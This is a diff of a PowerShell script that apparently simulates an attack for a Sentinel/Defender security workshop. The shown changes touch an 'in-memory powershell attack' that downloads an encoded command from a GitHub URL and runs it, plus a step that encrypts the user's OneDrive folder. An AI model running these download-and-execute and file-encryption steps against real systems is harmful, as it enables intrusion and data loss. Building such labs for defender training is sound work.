@@ -84,7 +84,7 @@ function ExecuteDocm()
     $password = "#PASSWORD#";
 
     #execute an in-memory powershell attack
-    $encodedCommand = Invoke-WebRequest "https://raw.githubusercontent.com/solliancenet/sentinel-defender-workshop-400/main/artifacts/day-02/Enumerate.txt"
+    $encodedCommand = Invoke-WebRequest "https://raw.githubusercontent.com/solliancenet/sentinel-defender-workshop-400/main/artifacts/day-02/Enumerate.txt" -UserBasicParsing;
     
     #do it...
     powershell.exe -noprofile -command $username, $password | powershell -noprofile -encodedcommand $encodedCommand;
@@ -135,7 +135,7 @@ function GoLateral()
 
 function EncryptFiles()
 {
-    . "c:\labfiles\$workshopName\artifacts\environment-setup\automation\EncryptHelper.ps1"
+    . "c:\labfiles\#WORKSHOP_NAME#\artifacts\environment-setup\automation\EncryptHelper.ps1"
 
     EncryptFiles $env:OneDriveCommercial;
 }
@@ -156,11 +156,18 @@ function MoveLogs()
     Copy-Item -path "$path\logs-03\*" "c:\logs"
 }
 
+. C:\LabFiles\Common.ps1
+
+Login-AzureCredsPowerShell
+
 mkdir c:\job -ea SilentlyContinue;
 mkdir c:\tools -ea SilentlyContinue;
 
 $path = "C:\labfiles\#WORKSHOP_NAME#\artifacts\day-02";
 cd $path;
+
+$username = "#USERNAME#";
+$password = "#PASSWORD#";
 
 #send the email to the user - another hint...
 SendEmail $username;
